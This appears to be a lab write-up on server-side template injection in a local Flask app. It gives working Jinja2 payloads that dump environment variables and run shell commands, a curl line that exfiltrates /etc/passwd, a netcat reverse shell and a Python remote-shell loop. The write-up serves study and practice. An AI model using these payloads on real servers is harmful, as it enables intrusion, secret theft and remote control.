# return the index of urllib in `subclasses()`

`self.__class__.__base__.__subclasses__()` gives us a list of all the classes. There are many urllib classes, `<class 'urllib.request.Request'>` is probably the most important one, so I will be finding the index of that. I used bash to get the index.

![image](https://github.com/HACKER097/WebEx/assets/38581702/5a81b86e-06c7-49e9-9159-e9141bc82fa8)

Index sill be -1 of line number, so index of `<class 'urllib.request.Request'>` is 343

![image](https://github.com/HACKER097/WebEx/assets/38581702/268b773c-9233-4f5a-a854-6b0a6ed21a72)

# get name of current python flask script

`self.__class__.__init__.__globals__.__builtins__.__import__('__main__')` Gives us the required result. 

`self.__class__.__init__.__globals__` helps us access the global namespace. 

`__builtins__` lets us accesss the builtin objects.

`__import__('__main__')` gives us the current file name/object.

![image](https://github.com/HACKER097/WebEx/assets/38581702/2ad11b91-ec11-40ee-96f3-fc00f7f9bca3)

# get all the current envvars

`self.__class__.__init__.__globals__.__builtins__.__import__('os').environ` This is very similar to the previous payload, jus import os instead of __main__ and get the `environ` attribute.

![image](https://github.com/HACKER097/WebEx/assets/38581702/aea92422-b0e7-4e7b-9d4b-3a5fa9ccdae0)

# read a local file

I tried getting a shell using `self.__class__.__init__.__globals__.__builtins__.__import__('os').system('ls ~')` which works, but does not give us the output, so even though we can run commands, we dont be able to see the output.

So I used subprocess instead `self.__class__.__init__.__globals__.__builtins__.__import__('subprocess').getoutput('ls ~')` which works. Now I can read any file using `cat`.

![image](https://github.com/HACKER097/WebEx/assets/38581702/8f7663d6-c5f2-49e0-b0b3-b84e4c87e981)

# run a command

Same as previous one. Just put the commands in `getoutput()`

# send the contents of etc pass to  awebhook

I am not doing that, because its probably not a good idea. Instead I started a pyhon server `python -m http.server 8000`

`http://127.0.0.1:5000/?c={{self.__class__.__init__.__globals__.__builtins__.__import__(%27subprocess%27).getoutput(%27curl%20http://0.0.0.0:8000/?c=$(cat%20/etc/passwd)%27)}}`

I once again used a shell to do this, because it the easier way. This is the command without formatting:

```bash
curl http://0.0.0.0:8000/?c=$(cat /etc/passwd)
```

![image](https://github.com/HACKER097/WebEx/assets/38581702/e5f49d8c-cbff-4557-ab08-0ab510be0345)

# Create reverse shell

I will be using a nc reverse shell, `nc 192.168.1.12 3333 -e sh`

![image](https://github.com/HACKER097/WebEx/assets/38581702/4702cbbe-912b-4b20-943d-279d6195b4ce)

![image](https://github.com/HACKER097/WebEx/assets/38581702/e8a247b4-a3b7-43fb-94bf-42df9b228918)

This is the final payload: `http://127.0.0.1:5000/?c={{self.__class__.__init__.__globals__.__builtins__.__import__('subprocess').getoutput('nc 192.168.1.12 3333 -e sh')}}`

I also created a this shell when I forgot what a reverse shell was. Thought it was worth mentioning:

```python
import requests

while True:
    command = input("$ ")
    url = "http://127.0.0.1:5000/?c={{self.__class__.__init__.__globals__.__builtins__.__import__(%27subprocess%27).getoutput('" + command + "')}}"
    resp = requests.get(url)
    print(resp.text)
```

# Doing all of this with a given blacklist

I could not figure this out. If the blacklist is implemented on client side, its a useless blacklist. But if its on server side, its feels impossible to get past it. Mainly because of `_`, `'`, and `"`

We need `'` to be able to import modules. Even if we get past it using `self.__class__.__base__.__subclasses__()[...]` to use the modules we need, its very likely that we will ned to use `'` to write filenames which we want to open or shell commands.

Even if we ignore `'` and `"`, blacklisting of `_` makes it impossible to get anywhere, because all python dunders have a `_` in them, and the entire payload relies on these dunderds. 
